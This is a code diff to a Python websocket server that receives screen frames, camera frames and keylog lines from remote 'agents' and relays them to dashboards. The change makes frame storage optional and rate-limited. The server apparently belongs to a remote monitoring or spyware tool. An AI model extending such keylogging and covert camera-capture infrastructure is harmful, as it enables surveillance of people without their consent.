@@ -10,10 +10,17 @@ import uuid
 import datetime as dt
 from db import get_session
 from models import EventFile
+import time
 
 router = APIRouter()
 
 MEDIA_ROOT = os.getenv("MEDIA_ROOT", os.path.join(os.path.dirname(__file__), 'media'))
+# Frame persistence controls (disable storing streaming frames by default to reduce I/O latency)
+STORE_SCREEN_FRAMES = str(os.getenv("STORE_SCREEN_FRAMES", "0")).strip().lower() in ("1","true","yes","on")
+STORE_CAMERA_FRAMES = str(os.getenv("STORE_CAMERA_FRAMES", "0")).strip().lower() in ("1","true","yes","on")
+SCREEN_STORE_MIN_MS = int(str(os.getenv("SCREEN_STORE_MIN_MS", "0")).strip() or "0")
+CAMERA_STORE_MIN_MS = int(str(os.getenv("CAMERA_STORE_MIN_MS", "0")).strip() or "0")
+_last_store_ts = {"screen": {}, "camera": {}}  # type: ignore[var-annotated]
 
 async def _store_media_event(kind: str, agent_id: str, frame: dict):
     # frame: {data: data_url, w?: int, h?: int}
@@ -178,15 +185,27 @@ async def ws_agent(ws: WebSocket):
             if data.get('type') == 'screen_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_screen_to_dashboards(agent_id, frame)
+                # Optional: store at most every SCREEN_STORE_MIN_MS when enabled (defaults disabled)
                 try:
-                    await _store_media_event('screen_image', agent_id, frame)
+                    if STORE_SCREEN_FRAMES:
+                        now_ms = int(time.time() * 1000)
+                        prev = int(_last_store_ts['screen'].get(agent_id, 0) or 0)
+                        if SCREEN_STORE_MIN_MS <= 0 or (now_ms - prev) >= SCREEN_STORE_MIN_MS:
+                            await _store_media_event('screen_image', agent_id, frame)
+                            _last_store_ts['screen'][agent_id] = now_ms
                 except Exception:
                     pass
             elif data.get('type') == 'camera_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_camera_to_dashboards(agent_id, frame)
+                # Optional: store at most every CAMERA_STORE_MIN_MS when enabled (defaults disabled)
                 try:
-                    await _store_media_event('camera_image', agent_id, frame)
+                    if STORE_CAMERA_FRAMES:
+                        now_ms = int(time.time() * 1000)
+                        prev = int(_last_store_ts['camera'].get(agent_id, 0) or 0)
+                        if CAMERA_STORE_MIN_MS <= 0 or (now_ms - prev) >= CAMERA_STORE_MIN_MS:
+                            await _store_media_event('camera_image', agent_id, frame)
+                            _last_store_ts['camera'][agent_id] = now_ms
                 except Exception:
                     pass
             elif data.get('type') == 'keylog_line':
